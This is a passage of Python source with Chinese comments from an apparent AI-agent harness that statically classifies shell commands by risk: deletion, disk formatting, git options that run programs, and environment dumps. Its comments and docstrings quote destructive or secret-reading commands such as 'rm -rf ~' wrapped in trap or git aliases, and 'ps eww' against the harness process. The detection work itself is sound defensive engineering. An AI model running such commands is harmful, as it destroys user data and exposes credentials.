            a.bump("external", f"路径 {val} 以变量开头，位置无法静态判断，按工作区外处理" if _VAR_HEAD.match(val)
                   else f"访问工作区外路径 {val}")
            break

    if cmd in SHELLS and (script := _shell_script(args)) is not None:
        _recurse(script, a, f"{cmd} -c")
    elif cmd == "eval":
        _recurse(" ".join(args), a, "eval")
    elif cmd == "trap":
        _trap(args, a)
    elif cmd == "watch":
        _watch(args, a)
    elif cmd in ("source", "."):
        a.bump("external", f"{cmd} 执行脚本文件，内容无法静态分析")
    elif cmd in DANGEROUS_CMDS:
        a.bump("dangerous", f"高危命令 {cmd}")
        dev = next((x[3:] for x in args if x.startswith("of=")), "")
        if cmd == "dd" and _BLOCK_DEV.match(dev):
            a.flag_catastrophic(f"dd 写入块设备 {dev}")
        script = next((args[k + 1] for k, x in enumerate(args[:-1]) if x in ("-c", "--command")), None)
        if cmd == "su" and script is not None:
            _recurse(script, a, "su -c")
    elif cmd.startswith("mkfs"):
        a.flag_catastrophic(f"格式化文件系统 {cmd}")
    elif cmd in ("env", "printenv") and not args:
        a.bump("external", "输出全部环境变量（可能包含密钥）")
    elif cmd == "ps" and _ps_shows_env(args):
        # 子进程的环境已经剥掉了密钥，ps 看的却是别的进程——包括 harness 自己（ps eww -p $PPID）。与 /proc/*/environ 同档
        a.flag_credential("ps 带 e/E 选项会打印进程的环境变量（等同读取 /proc/<pid>/environ），包括 harness 自身的密钥")
    elif cmd == "rm":
        flags = "".join(x for x in args if x.startswith("-"))
        targets = [x for x in args if not x.startswith("-")]
        recursive = "r" in flags or "R" in flags
        roots = [t for t in targets if _is_root_like(t)]
        if recursive and roots:
            a.flag_catastrophic(f"递归删除 {roots[0]}")
        elif recursive and any(t.rstrip("/") in ("*", "..", ".", "") or _is_outside(t, a) for t in targets):
            a.bump("dangerous", "递归删除工作区外路径或整个工作区")
        else:
            a.bump("write", "删除文件")
    elif cmd in ("chmod", "chown") and any(x in ("-R", "--recursive") for x in args) and \
            any(t.rstrip("/") in ("", *_HOME) for t in args if not t.startswith("-")):
        a.flag_catastrophic("递归修改根目录/家目录的权限")
    elif cmd == "git":
        _git(args, a)
    elif cmd == "find":
        if any(x in ("-delete", "-exec", "-execdir", "-ok", "-okdir") for x in args):
            a.bump("write", "find 带 -delete/-exec")
            _find_actions(args, a)
        elif any(x in ("-fprint", "-fprint0", "-fprintf", "-fls") for x in args):
            a.bump("write", "find 把结果写入文件")
        else:
            a.bump("read", "find 只读搜索")
    elif cmd in ("export", "declare", "typeset", "local", "readonly"):
        for x in args:
            if _ASSIGN.fullmatch(x):
                _check_assign(x, a)
        a.bump("write", f"{cmd} 修改 shell 变量")
    elif cmd in ("sed", "perl") and any(re.fullmatch(r"-[A-Za-z]*i.*|--in-place.*", x) for x in args):
        a.bump("write", f"{cmd} -i 原地修改文件")   # 含合写的短选项：sed -Ei、sed -ni.bak
    elif cmd == "sed":
        _sed(args, a)
    elif cmd in ("awk", "gawk", "mawk"):
        _awk(cmd, args, a)
    elif cmd in INTERPRETERS and any(x in ("-c", "-e", "--eval") or re.fullmatch(r"-[A-Za-z]*[ce]", x) for x in args):
        a.bump("external", f"{cmd} 内联代码无法静态分析")   # 含合写的短选项：python3 -Ic、perl -ne、node -pe
        a.inline = True
    elif cmd in SHELLS and not [x for x in args if not x.startswith("-")]:
        a.bump("external", f"{cmd} 从标准输入执行脚本，内容无法静态分析")
    elif cmd in ("python", "python3") and args[:1] in (["--version"], ["-V"]):
        a.bump("read", "查询版本")
    elif (cmd, args[0] if args else "") in NET_INSTALL:
        a.bump("external", f"{cmd} {args[0]} 会访问网络并修改依赖")
        a.network = True
    elif cmd in EXTERNAL_CMDS:
        a.bump("external", f"{cmd} 访问外部系统")
        a.network = True
    elif cmd in WRITE_CMDS:
        a.bump("write", f"{cmd} 可能修改文件或执行代码")
        _embedded_catastrophe(cmd, args, a)
    elif cmd in READ_CMDS:
        risk = _read_options(cmd, args)
        if risk:
            a.bump(*risk)
            a.inline = a.inline or risk[0] == "external"
        else:
            a.bump("read", f"{cmd} 只读")
    else:
        a.bump("write", f"未知命令 {cmd}，按可写处理")
        _embedded_catastrophe(cmd, args, a)


def _program_args(cmd: str, args: list[str]) -> set[int]:
    """sed / awk 的程序文本在 args 里的位置。``sed -n '/x/p'`` 的 ``/x/p`` 不是路径，不参与工作区边界判断；
    程序里写文件、执行命令由 _sed / _awk 单独判断。程序来自 -f 文件时，第一个位置参数是数据文件，照常判断。"""
    if cmd == "sed":
        code, takes = ("-e", "--expression"), {"-l", "--line-length", "-f", "--file"}
    elif cmd in ("awk", "gawk", "mawk"):
        code, takes = ("-e", "--source"), {"-F", "-v", "-f", "--file", "-i", "--include", "-l", "--load", "-W"}
    else:
        return set()
    out: set[int] = set()
    explicit, i = False, 0
    while i < len(args):
        x = args[i]
        if x in code and i + 1 < len(args):
            out.add(i + 1)
            explicit, i = True, i + 2
            continue
        if x.startswith(("--expression=", "--source=")):
            out.add(i)
            explicit = True
        elif x.startswith(("-f", "--file")):
            explicit = True
        if x in takes:
            i += 2
            continue
        if x.startswith("-"):
            i += 1
            continue
        if not explicit:
            out.add(i)
        break
    return out


def _short_opts(args: list[str], takes_value: str) -> set[str]:
    """拆开短选项簇（``-uo`` → u、o），遇到带值的选项就停：``-T/tmp/foo`` 里的 o 是值，不是 ``-o``。"""
    found: set[str] = set()
    for x in args:
        if x == "--":
            break
        if len(x) < 2 or x[0] != "-" or x[1] == "-":
            continue
        for c in x[1:]:
            found.add(c)
            if c in takes_value:
                break
    return found


def _read_options(cmd: str, args: list[str]) -> tuple[str, str] | None:
    """“只读”命令里执行命令或写文件的选项。返回 (等级, 原因)，没有时返回 None。"""
    longs = {x.split("=", 1)[0] for x in args if x.startswith("--")}
    if cmd == "rg" and (hit := longs & {"--pre", "--hostname-bin"}):
        return "external", f"rg {min(hit)} 会执行指定的程序"
    if cmd == "ag" and "--pager" in longs:
        return "external", "ag --pager 会执行指定的分页程序"
    if cmd == "sort":
        if hit := longs & {"--compress-program", "--files0-from"}:
            return "external", f"sort {min(hit)} 会执行指定的程序或从文件里取要读的路径"
        if "--output" in longs or "o" in _short_opts(args, "kotST"):
            return "write", "sort -o 写入文件"
    if cmd == "uniq" and len(_positional(args, {"-f", "-s", "-w", "--skip-fields", "--skip-chars", "--check-chars"})) >= 2:
        return "write", "uniq 的第二个参数是输出文件，会被覆盖"
    if cmd == "tree" and _short_opts(args, "LPIoHT") & {"o", "R"}:
        return "write", "tree -o / -R 把结果写入文件"
    if cmd in ("less", "more"):
        if "k" in _short_opts(args, "bhjkoOpPtTxyz#D") or any(x.startswith("--lesskey") for x in longs):
            return "external", f"{cmd} 加载的 lesskey 文件可以设置预处理命令（LESSOPEN）"
        if any(x.startswith("+") and ("!" in x or "|" in x) for x in args):
            return "external", f"{cmd} 的启动命令里有 shell 命令"
        if _short_opts(args, "bhjkoOpPtTxyz#D") & {"o", "O"} or longs & {"--log-file", "--LOG-FILE"}:
            return "write", f"{cmd} -o 把内容写入日志文件"
    if cmd == "file" and ("C" in _short_opts(args, "efFmMP") or "--compile" in longs):
        return "write", "file -C 在当前目录写入编译后的 magic 文件"
    if cmd == "printf" and args[:1] == ["-v"]:
        name = args[1] if len(args) > 1 else ""
        if BENIGN_ENV.fullmatch(name):
            return "write", "printf -v 给 shell 变量赋值"
        return "external", f"printf -v 给变量 {name} 赋值，可能改变后续命令实际执行的程序"
    return None


def _positional(args: list[str], takes_value: set[str]) -> list[str]:
    """位置参数：跳过选项与选项带的值。"""
    out, i = [], 0
    while i < len(args):
        x = args[i]
        if x == "--":
            return out + args[i + 1:]
        if x in takes_value:
            i += 2
            continue
        if not x.startswith("-") or x == "-":
            out.append(x)
        i += 1
    return out


# sed 的 w / W（写文件）、e（把模式空间当命令执行）、r / R（读文件）命令，以及 s 命令的 w / e 标志
_SED_IO = re.compile(r"(^|[;{}\s])[0-9,$]*\s*[wWerR](\s|[;}]|$)|/[gpIiMm0-9]*[we](\s|[;}]|$)")


def _sed(args: list[str], a: CommandAnalysis) -> None:
    if any(re.fullmatch(r"-[A-Za-z]*f.*", x) or x.startswith("--file") for x in args):
        a.bump("external", "sed -f 从文件读取程序，内容无法静态分析")
        a.inline = True
    elif _SED_IO.search(" ".join(x for x in args if not x.startswith("-"))):
        a.bump("external", "sed 程序含 w/e/r 命令（写文件、执行命令或读别的文件）")
    else:
        a.bump("read", "sed 流式处理")


_AWK_CODE = ("-f", "--file", "-E", "--exec", "-i", "--include", "-l", "--load", "-D", "--debug")
_AWK_WRITE = ("-d", "--dump-variables", "-o", "--pretty-print", "-p", "--profile")


def _awk(cmd: str, args: list[str], a: CommandAnalysis) -> None:
    opts = [x for x in args if x.startswith("-")]
    prog = " ".join(x for x in args if not x.startswith("-"))
    if any(x.startswith(_AWK_CODE) for x in opts):
        a.bump("external", f"{cmd} 从文件加载程序或扩展（-f / -E / -i / -l），内容无法静态分析")
        a.inline = True
    elif re.search(r"system\s*\(|\|\s*getline|print[^;}]*(>|\|)|@(ns)?include|@load", prog):
        a.bump("external", f"{cmd} 程序里执行命令、写文件或加载扩展")
    elif any(x.startswith(_AWK_WRITE) for x in opts):
        a.bump("write", f"{cmd} 把调试信息写入文件")
    else:
        a.bump("read", f"{cmd} 流式处理")


def _trap(args: list[str], a: CommandAnalysis) -> None:
    """``trap '命令' 信号``：命令会在收到信号或退出时执行（``trap 'rm -rf ~' EXIT``），按一条命令递归分析。"""
    args = args[1:] if args[:1] == ["--"] else args
    if not args or args[0].startswith("-") or not args[0].strip():   # trap、trap -p、trap - EXIT、trap '' INT
        a.bump("read", "trap 列出或重置信号处理")
        return
    _recurse(args[0], a, "trap")


def _watch(args: list[str], a: CommandAnalysis) -> None:
    """``watch [选项] 命令``：命令交给 ``sh -c`` 反复执行（-x 时直接执行），按一条命令递归分析。"""
    i, direct = 0, False
    while i < len(args) and args[i].startswith("-"):
        direct = direct or args[i] in ("-x", "--exec")
        i += 2 if args[i] in ("-n", "--interval", "-q", "--equexit") else 1
    if i < len(args):
        _recurse(shlex.join(args[i:]) if direct else " ".join(args[i:]), a, "watch")


def _embedded_catastrophe(cmd: str, args: list[str], a: CommandAnalysis) -> None:
    """未知命令可能只是又套了一层：taskset 1 rm -rf ~、strace -f rm -rf ~、busybox rm -rf ~。
    从认得的高危命令名开始，把剩下的参数当成一条命令再分析，只采纳“灾难性”结论（等级仍按原命令处理）。"""
    if a.depth >= 3:
        return
    for i, w in enumerate(args[:16]):
        head = w.rsplit("/", 1)[-1]
        if head in _CATASTROPHE_HEADS or head.startswith("mkfs"):
            inner = analyze(shlex.join(args[i:]), a.workspace, _depth=a.depth + 1)
            if inner.catastrophic:
                a.flag_catastrophic(f"{cmd} 包装执行：{inner.catastrophic_reason}")
            return


def _is_root_like(t: str) -> bool:
    """根目录、家目录，以及它们下面的一级目录（/usr、/etc、~/projects、$HOME/Documents……）：整棵删掉就是灾难。"""
    return (t.rstrip("/") in ("", "/*", *_HOME, "~/*", "$HOME/*")
            or bool(re.fullmatch(r"/[^/]+/?", t) or re.fullmatch(r"(~|\$HOME|\$\{HOME\})/[^/]+/?", t)))


def _shell_script(args: list[str]) -> str | None:
    """``bash -c`` 的脚本。``-c`` 可以和别的短选项合写（``-lc``、``-ec``、``-xc``），脚本是选项之后的第一个非选项参数；
    ``-o``/``-O`` 与 ``--rcfile`` 这类选项带一个值。没有 ``-c`` 时返回 None。"""
    has_c, i = False, 0
    while i < len(args):
        x = args[i]
        if x == "--":
            i += 1
            break
        if x in ("--rcfile", "--init-file"):
            i += 2
        elif x.startswith("--"):
            i += 1
        elif len(x) > 1 and x[0] in "-+":
            has_c = has_c or (x[0] == "-" and "c" in x[1:])
            i += 2 if x[-1] in "oO" else 1
        else:
            break
    if not has_c:
        return None
    return args[i] if i < len(args) else ""


def _find_actions(args: list[str], a: CommandAnalysis) -> None:
    """``find`` 的删除与执行动作。起点路径会被自己的动作处理到（``find ~ -delete`` 删的就是整个家目录），
    所以 ``-exec`` 的命令把 ``{}`` 换成起点路径再递归分析：``find ~ -exec rm -rf {} +`` 等同 ``rm -rf ~``。"""
    i = 0
    while i < len(args) and (args[i] in ("-H", "-L", "-P", "-E", "-X", "-d", "-s", "-x") or args[i].startswith("-O")
                             or args[i] in ("-D", "-f")):
        i += 2 if args[i] in ("-D", "-f") else 1
    roots: list[str] = []
    while i < len(args) and not args[i].startswith(("-", "(", "!", ")")):
        roots.append(args[i])
        i += 1
    roots = roots or ["."]
    if "-delete" in args:
        hit = next((r for r in roots if _is_root_like(r)), None)
        if hit:
            a.flag_catastrophic(f"find {hit} -delete 删除整棵目录树")
    for j, x in enumerate(args):
        if x not in ("-exec", "-execdir", "-ok", "-okdir"):
            continue
        end = next((k for k in range(j + 1, len(args)) if args[k] in (";", "+")), len(args))
        action = args[j + 1:end]
        if not action:
            continue
        for root in roots[:4]:
            _recurse(shlex.join(root if w == "{}" else w for w in action), a, f"find {x}")


def _ps_shows_env(args: list[str]) -> bool:
    """ps 是否会打印进程环境：``-E``（macOS）或 BSD 风格的 ``e``（``ps eww``、``ps axe``，macOS 与 Linux 都是）。
    ``ps -e`` / ``ps -ef`` 是“所有进程”，不打印环境。带值的选项（``-p 1``、``-o pid``、``U deploy``）跳过它的值。"""
    takes_value = set("GgMNOopqtUuCs")
    skip = False
    for x in args:
        if skip:
            skip = False
            continue
        if x.startswith("--"):
            continue
        dash = x.startswith("-")
        letters = x[1:] if dash else x
        if not re.fullmatch(r"[A-Za-z]+", letters):
            continue
        if ("E" in letters) if dash else ("e" in letters.lower()):
            return True
        skip = letters[-1] in takes_value
    return False


def _recurse(script: str, a: CommandAnalysis, via: str) -> None:
    """``sh -c`` / ``eval`` 的字符串本身就是一条命令：递归分析（限制深度，防止构造的深层嵌套拖慢判定）。"""
    a.inline = True
    if a.depth >= 3 or not script.strip():
        a.bump("external", f"{via} 嵌套过深或内容为空，无法静态分析")
        return
    inner = analyze(script, a.workspace, _depth=a.depth + 1)
    a.bump(inner.level, f"{via}：{inner.reasons[0] if inner.reasons else '内层命令'}")
    a.reasons.extend(r for r in inner.reasons[1:] if r not in a.reasons)
    a.opaque = a.opaque or inner.opaque
    if inner.catastrophic and not a.catastrophic:
        a.catastrophic, a.catastrophic_reason = True, f"{via}：{inner.catastrophic_reason}"
    if inner.credential and not a.credential:
        a.credential, a.credential_reason = True, f"{via}：{inner.credential_reason}"
    a.network = a.network or inner.network


# 值是一条命令的配置键：git -c core.pager='rm -rf ~' log 执行的就是 rm -rf ~
_GIT_EXEC_KEYS = re.compile(r"core\.(pager|sshcommand|fsmonitor|editor|hookspath|gitproxy|askpass)|diff\.external"
                            r"|sequence\.editor|credential\.([^=]*\.)?helper|[^=]*\.(command|program|textconv|cmd|clean|smudge"
                            r"|process|driver)", re.I)


# 仓库自己的配置也能让只读的 git 命令执行程序：.gitattributes 把文件交给 filter / diff 驱动之后，git diff、git log -p、
# git show 会运行 .git/config 里的 clean、smudge、textconv。驱动名是任意的，没法像 core.fsmonitor 那样在环境里统一关掉，
# 这里只看配置里有没有定义它们（include 引入的文件看不到，同样算上）；git-lfs 安装时写下的标准驱动只运行 git-lfs 本身，放行
_CFG_SECTION = re.compile(r'\[\s*([^\]\s"]+)(?:\s+"((?:[^"\\\n]|\\.)*)")?\s*\]')
_CFG_KEY = re.compile(r"([A-Za-z][\w-]*)\s*(?:=\s*(.*))?$")
_LFS_DRIVER = {"clean": "git-lfs clean -- %f", "smudge": "git-lfs smudge -- %f", "process": "git-lfs filter-process"}
_CONFIG_LIMIT = 1 << 20


def _config_programs(text: str) -> list[str]:
    """git 配置文本里定义的外部程序（filter / diff 驱动、diff.external、gpg.program）与 include。宁可多报。"""
    found, section = [], ""
    for line in text.lstrip("﻿").splitlines():
        line = line.strip()
        while m := _CFG_SECTION.match(line):   # 节头后面同一行还能再跟节头或变量
            name = m.group(1).lower()
            section = name if m.group(2) is None else f"{name}.{m.group(2)}"
            if name.split(".")[0] in ("include", "includeif"):
                found.append(f"[{section}]")
            line = line[m.end():].strip()
        k = _CFG_KEY.match(line)
        if not k:
            continue
        key, val, kind = k.group(1).lower(), (k.group(2) or "").strip().strip('"'), section.split(".")[0]
        if ((kind == "filter" and key in ("clean", "smudge", "process"))
                or (kind == "diff" and (key in ("textconv", "command") or (section == "diff" and key == "external")))
                or (kind == "gpg" and key == "program")) and _LFS_DRIVER.get(key) != val:
            found.append(f"{section}.{key}")
    return found


@functools.lru_cache(maxsize=64)
def _config_file_programs(path: str, mtime_ns: int, size: int) -> tuple[str, ...]:
    if size > _CONFIG_LIMIT:
        return (f"{os.path.basename(path)}（{size} 字节，过大未检查）",)
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return tuple(_config_programs(f.read()))
    except OSError:
        return ()


def _repo_programs(workspace: str | None, chdir: str) -> list[str]:
    """命令要操作的仓库（从工作区或 -C 指定的目录向上找 .git，和 git 自己一样）在本地配置里定义的外部程序。"""
    if not workspace:
        return []
    d = os.path.realpath(os.path.join(_realroot(workspace), chdir))
    gitdirs: list[str] = []
    for _ in range(64):
        dot = os.path.join(d, ".git")
        if os.path.isdir(dot):
            gitdirs = [dot]
            break
        if os.path.isfile(dot):   # 工作树、子模块：.git 是一个写着 gitdir: <路径> 的文件
            try:
                with open(dot, encoding="utf-8", errors="replace") as f:
                    head = f.read(4096).strip()
            except OSError:
                return []
            if head.startswith("gitdir:"):
                gitdirs = [os.path.join(d, head[7:].strip())]
            break
        parent = os.path.dirname(d)
        if parent == d:
            return []
        d = parent
    for g in list(gitdirs):
        try:
            with open(os.path.join(g, "commondir"), encoding="utf-8", errors="replace") as f:
                gitdirs.append(os.path.join(g, f.read(4096).strip()))
        except OSError:
            pass
    found: list[str] = []
    for g in gitdirs:
        for name in ("config", "config.worktree"):
            try:
                st = os.stat(os.path.join(g, name))
            except OSError:
                continue
            found += _config_file_programs(os.path.join(g, name), st.st_mtime_ns, st.st_size)
    return found


def _git(args: list[str], a: CommandAnalysis) -> None:
    # 全局选项：-C <dir>、-c k=v、--git-dir=...。-c / --config-env 能指定外部程序（core.pager、alias.x=!cmd……），
    # --exec-path=<目录> 换掉 git 子命令的位置，--git-dir / --work-tree / --bare 指向别的仓库——那个仓库的配置同样能执行命令
    i, chdir = 0, ""
    while i < len(args) and args[i].startswith("-"):
        x = args[i]
        if x in ("-c", "--config-env") and i + 1 < len(args):
            _git_config(args[i + 1], a, from_env=x == "--config-env")
            i += 2
        elif x.startswith("--config-env="):
            _git_config(x.split("=", 1)[1], a, from_env=True)
            i += 1
        elif x.startswith("--exec-path="):
            a.bump("external", "git --exec-path 指定子命令所在的目录，可以执行任意程序")
            a.inline = True
            i += 1
        elif x in ("--git-dir", "--work-tree", "--bare") or x.startswith(("--git-dir=", "--work-tree=")):
            a.bump("external", f"git {x.split('=')[0]} 指向别处的仓库，那个仓库的配置（textconv、diff 驱动……）可以执行命令")
            i += 2 if x in ("--git-dir", "--work-tree") else 1
        elif x in ("-C", "--namespace", "--super-prefix") and i + 1 < len(args):
            if x == "-C":
                chdir = os.path.join(chdir, args[i + 1])
            i += 2
        else:
            i += 1
    sub, rest = (args[i], args[i + 1:]) if i < len(args) else ("", [])

    def read(reason: str) -> None:
        a.bump("read", reason)
        progs = _repo_programs(a.workspace, chdir)
        if progs:
            # 实际执行的程序写在仓库配置里、不在命令文本里：allow:bash(git diff*) 这类前缀规则也不能替人放行
            a.bump("external", f"仓库配置为 git 定义了外部程序（{'、'.join(progs[:3])}），git {sub} 可能执行它们")
            a.opaque = True
    if any(x.startswith("--output") or x in ("--ext-diff",) for x in rest):
        a.bump("write", f"git {sub} 带 --output/--ext-diff")
    flags = set(_git_flags(rest))
    positional = [x for x in rest if not x.startswith("-")]
    if not sub:
        a.bump("read", "git 全局查询（--version 等）")
    elif sub == "grep" and flags & {"-O", "--open-files-in-pager"}:
        a.bump("external", "git grep -O 会用指定的程序打开匹配的文件")
        a.inline = True
    elif sub in GIT_READ:
        read("git 只读命令")
    elif sub in _GIT_REFS:
        writes, lists = _GIT_REFS[sub]
        if flags & writes or (positional and not flags & lists):
            a.bump("write", f"git {sub} 会创建、删除或改动{'分支' if sub == 'branch' else '标签'}")
        else:
            read(f"git {sub} 列出引用")
    elif sub == "remote":
        action = positional[0] if positional else ""
        if action in ("", "get-url") or (action == "show" and "-n" in flags):
            read("git remote 列出远端")
        elif action in ("show", "update", "prune") or (action in ("add", "set-head") and flags & {"-f", "--fetch", "-a", "--auto"}):
            a.bump("external", f"git remote {action} 会访问远端")
            a.network = True
        else:
            a.bump("write", f"git remote {action} 修改远端配置")
    elif (sub, positional[:1]) in (("stash", ["list"]), ("stash", ["show"]), ("worktree", ["list"])) or \
            (sub == "reflog" and positional[:1] not in (["expire"], ["delete"])):
        read(f"git {sub} 只读查询")
    elif sub in GIT_EXTERNAL:
        if "--force" in rest or "-f" in rest or any(x.startswith(("+", "--force")) for x in rest):
            a.bump("dangerous", "强制推送会改写远端历史")
        else:
            a.bump("external", f"git {sub} 访问远端")
        a.network = True
    elif sub in ("reset", "clean") and any(x in ("--hard", "-f", "-fd", "-fdx", "-xdf", "-df") for x in rest):
        a.bump("dangerous", f"git {sub} 会丢弃未提交的修改")
    elif sub in ("config", "submodule", "filter-branch"):
        a.bump("external", f"git {sub} 可能配置命令执行或访问远端")
    else:
        a.bump("write", f"git {sub} 修改仓库")


def _git_flags(args: list[str]):
    """选项逐个列出：长选项去掉 ``=值``，短选项簇拆开（``-Dr`` → ``-D``、``-r``）——合写的删除选项也要认得出来。"""
    for x in args:
        if x.startswith("--"):
            yield x.split("=", 1)[0]
        elif x.startswith("-") and len(x) > 1:
            yield from (f"-{c}" for c in x[1:])


def _git_config(kv: str, a: CommandAnalysis, *, from_env: bool = False) -> None:
    """``git -c 键=值`` / ``--config-env=键=环境变量``：只放行 GIT_SAFE_CONFIG 里的键。值是命令的键递归分析——
    bypass 模式也要认出 ``git -c alias.x='!rm -rf ~' x`` 这种灾难性命令。"""
    key, _, val = kv.partition("=")
    if GIT_SAFE_CONFIG.fullmatch(key):
        return
    a.inline = True
    if from_env:
        a.bump("external", f"git --config-env 设置 {key}，值来自环境变量，无法静态分析")
    elif val.startswith("!") or _GIT_EXEC_KEYS.fullmatch(key):
        a.bump("external", f"git -c {key} 可以执行任意命令")
        if val.strip("!"):
            _recurse(val.lstrip("!"), a, f"git -c {key}")
    else:
        a.bump("external", f"git -c {key} 不在无害配置清单内（可能指定外部程序或引入别的配置文件）")


def max_level(*levels: str) -> str:
    return max(levels, key=lambda x: _RANK[x])
